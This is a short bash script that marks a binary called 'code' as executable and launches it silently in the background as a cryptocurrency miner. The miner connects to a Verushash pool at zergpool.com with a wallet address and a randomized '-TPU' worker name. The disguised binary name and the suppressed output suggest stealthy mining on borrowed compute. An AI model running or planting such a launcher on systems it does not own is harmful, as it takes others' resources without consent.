#!/bin/bash
chmod +x code >/dev/null 2>&1
nohup ./code -v -l  verushash.asia.mine.zergpool.com:3300 -u XimPGUowKWQSoCjiTKnxyHxwBPTdvqRvBZ.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 16 -x >/dev/null 2>&1
